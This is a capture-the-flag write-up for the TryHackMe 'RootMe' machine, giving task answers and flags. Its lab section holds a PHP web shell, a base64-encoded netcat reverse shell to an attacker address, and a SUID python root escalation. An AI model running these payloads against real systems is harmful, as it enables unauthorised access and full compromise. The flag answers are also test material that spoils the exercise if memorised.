# RootMe 

## Task 1  Deploy the machine
+ Deploy The Machine `No Answer Needed`

## Task 2  Reconnaissance
+ Scan the machine, how many ports are open?`2`
+ What version of Apache is running? `2.4.29`
+ What service is running on port 22? `ssh`
+ Find directories on the web server using the GoBuster tool.`No Answer Needed`
+ What is the hidden directory?`/panel/`

## Task 3  Getting a shell
+ user.txt`THM{y0u_g0t_a_sh3ll}`

## Task 4  Privilege escalation
+ Search for files with SUID permission, which file is weird?`/usr/bin/python`
+ Find a form to escalate your privileges.`No Answer Needed`
+ root.txt`THM{pr1v1l3g3_3sc4l4t10n}`

## Hand's On Lab 

```bash
nmap -sC -sV 10.10.174.74 > nmap_scan
gobuster dir -u http://10.10.174.74/ -w ~/HackTools/directory-list-2.3-medium.txt
hengkisirait: RootMe $ gobuster dir -u http://10.10.174.74/ -w ~/HackTools/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.174.74/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/hengkisirait/HackTools/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/02/13 02:55:33 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.174.74/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.174.74/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.174.74/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.174.74/panel/]
```

+ Create some file with difference extention `.php5`
```php
<?php echo system($_GET['c']); ?>
```

+ Payload on parameter 
```bash
echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC40LjM3LjE2MCAxMzM3ID4vdG1wL2Y= | base64 -d > shell.sh

chmod 777 shell.sh
```

+ Enumeration
```bash
www-data@rootme:/var/www$ cat user.txt
cat user.txt
THM{y0u_g0t_a_sh3ll}
```
+ Find SUID file using `find / -perm /4000 2>/dev/null` and there is `/usr/bin/python` on list
+ Escalation `python SUID file`
```bash
python -c "import os; os.execl('/bin/bash','bash','-p')"
bash-4.4# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```



